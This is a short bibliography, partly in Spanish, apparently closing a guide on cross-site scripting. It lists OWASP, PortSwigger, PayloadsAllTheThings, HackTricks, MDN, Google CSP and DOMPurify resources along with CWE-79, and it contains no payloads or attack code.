- OWASP Cross Site Scripting Prevention Cheat Sheet; DOM based XSS Prevention Cheat Sheet; WSTG-INPV-01/02, WSTG-CLNT-01/03/11.
- PortSwigger Web Security Academy — Cross-site scripting, DOM-based vulnerabilities, Content Security Policy, Dangling markup; **XSS Cheat Sheet** de PortSwigger (vectores por evento y navegador).
- PayloadsAllTheThings — *XSS Injection*.
- HackTricks — *XSS (Cross Site Scripting)*, *Dangling Markup*, *DOM clobbering*, *PostMessage vulnerabilities*.
- Google — CSP Evaluator; web.dev «Mitigate XSS with a strict CSP»; Trusted Types (W3C).
- MDN — Content-Security-Policy, Trusted Types API, HTML Sanitizer API.
- Cure53 DOMPurify (avisos de seguridad del repositorio).
- CWE-79.
- Adaptado en parte de SnailSploit *offensive-checklist* (licencia MIT).
